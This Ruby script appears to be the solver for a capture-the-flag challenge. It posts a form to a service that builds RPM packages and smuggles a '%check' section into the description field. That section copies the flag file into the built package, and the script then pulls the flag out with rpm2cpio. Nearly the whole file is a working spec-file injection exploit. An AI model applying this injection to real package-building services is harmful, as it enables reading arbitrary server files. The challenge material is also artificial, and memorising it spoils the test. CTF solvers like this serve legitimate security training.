# How to use:: ruby ./solve.rb | rpm2cpio | strings

require 'httparty'
require 'tempfile'
require 'fileutils'

METADATA = YAML::load(File.read('../metadata.yml'))
EXPECTED_FLAG = METADATA['flag']
FLAG_PATH = METADATA['flag_path']
DEFAULT_PORT = METADATA['port']

TARGET = ARGV[0] || "http://localhost:#{ DEFAULT_PORT }"
TARGET_FILE_NAME = 'thiscanbeanythingreasonablyunguessable'
if TARGET[-1] != '/'
  TARGET.concat('/')
end

begin
  t = Tempfile.new(TARGET_FILE_NAME)

  out = HTTParty.post(
    "#{ TARGET }generate",

    headers: {
      'Content-Type' => "multipart/form-data",
    },

    :body => {
      :name        => 'name',
      :summary     => 'summary',
      :version     => 'hi',
      :release     => '2',

      # The payload is here - it copies the flag over top of the target filename
      :description => "description\n\n%check\n\ncp #{ FLAG_PATH } $RPM_BUILD_ROOT/name/#{ TARGET_FILE_NAME }*\n",

      'file'  => [t],
    }
  )

  t2 = Tempfile.new()
  t2.write(out.parsed_response)
  File.write(t2, out.parsed_response)
  t2.close()

  puts "This should be an RPM file:"
  system("file #{ t2.path }")
  puts
  puts "Attempting to parse and validate the flag with rpm2cpio..."
  if system("rpm2cpio #{ t2.path } | strings | fgrep '#{ EXPECTED_FLAG }'")
    puts "Success!"
    exit 0
  else
    puts "rpm2cpio didn't run correctly, or the correct flag wasn't returned!"
    exit 1
  end
ensure
  t.close
  t.unlink()
  t2.close()
  t2.unlink()
end

exit 1
